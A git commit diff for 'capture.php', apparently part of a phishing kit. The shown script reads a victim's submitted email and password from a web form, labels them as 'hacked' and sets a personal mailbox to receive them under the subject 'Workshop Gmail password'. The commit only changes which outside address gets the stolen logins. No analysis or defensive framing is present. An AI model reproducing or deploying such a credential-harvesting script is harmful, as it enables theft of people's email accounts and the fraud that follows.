cb4637c102e63cac576250ddf2edb620312b5b1c
larsonb6 <68410126+larsonb6@users.noreply.github.com>
2020-09-02 22:09:30 +0000

    Update capture.php

--- capture.php
+++ capture.php
@@ -1,7 +1,7 @@
 <?php
         $mailhacked = $_POST["email"];
         $passwordhacked = $_POST["password"];
-         $to = "jonasice808@gmail.com";
+         $to = "ouedraogomoussa@protonmail.ch";
          $subject = "Workshop Gmail password";
          
          $message = "$mailhacked";
